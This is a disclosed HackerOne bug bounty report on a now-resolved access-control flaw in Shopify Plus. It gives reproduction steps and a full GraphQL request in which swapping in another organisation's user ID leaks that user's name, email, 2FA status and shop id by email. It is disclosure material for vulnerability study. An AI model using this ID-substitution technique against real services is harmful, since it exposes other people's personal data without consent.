---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1085042'
original_report_id: '1085042'
title: '[h1-2102] Improper Access Control at https://shopify.plus/[id]/users/api in
  operation UpdateOrganizationUserTfaEnforcement'
weakness: Improper Access Control - Generic
team_handle: shopify
created_at: '2021-01-23T03:33:14.623Z'
disclosed_at: '2022-07-11T21:15:54.522Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 25
asset_identifier: Plus Web Admin with Single Domain Feature
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# [h1-2102] Improper Access Control at https://shopify.plus/[id]/users/api in operation UpdateOrganizationUserTfaEnforcement

## Metadata

- HackerOne Report ID: 1085042
- Weakness: Improper Access Control - Generic
- Program: shopify
- Disclosed At: 2022-07-11T21:15:54.522Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
There is an access control issue that happens when a Shopify Plus user tries to update the 2FA requirement of a user in another organisation. While the response shows an error message, an email is sent to the user with the 2FA status, first name, last name, email address, and shop id from the victim.

## Steps To Reproduce:
1. Log in to your Shopify Plus account https://shopify.plus/login
2. Go to `Administration` -> `Users` then go in one of the user page
3. In the `Security` section, edit the 2FA setting

    {F1168658}
4. Notice the following request:
    ```http
POST /34808573/users/api HTTP/1.1
Host: shopify.plus
 [...]

    {
        "operationName": "UpdateOrganizationUserTfaEnforcement",
        "variables": {
            "id": "Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNTc5Mzg=",
            "enforced": false
        },
        "query": "mutation UpdateOrganizationUserTfaEnforcement($id: OrganizationUserID!, $enforced: Boolean!) {\n  updateOrganizationUserTfaEnforcement(id: $id, enforced: $enforced) {\n    organizationUser {\n      id\n      tfaEnforced\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    operationStatus\n    message\n    __typename\n  }\n}\n"
    }
```
5. In Burp Repeater, edit the `id` with `Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNzE2MzI=`
6. You will receive an email containing Anatoly information :
{F1168661}

## Impact

A Shopify Plus user can retrieve information (2FA status, first name, last name, email address, shop ip) from a user in another organisation.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
